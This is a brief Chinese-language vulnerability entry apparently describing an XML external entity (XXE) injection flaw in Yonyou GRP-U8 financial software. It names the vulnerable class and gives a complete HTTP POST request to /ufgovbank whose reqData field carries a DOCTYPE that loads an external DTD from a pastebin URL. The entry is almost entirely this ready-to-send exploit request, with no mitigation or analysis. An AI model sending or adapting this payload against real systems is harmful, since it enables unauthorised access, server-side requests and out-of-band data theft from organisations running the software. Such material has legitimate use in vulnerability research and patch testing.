## 用友GRP-U8存在XML注入漏洞

```

漏洞文件为：WEB-INF/classes/com/ufgov/bank/ufgovBank.class

POST /ufgovbank HTTP/1.1

Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
 
reqData=<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "https://pastebin.com/raw/E2d5s60p">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest

```
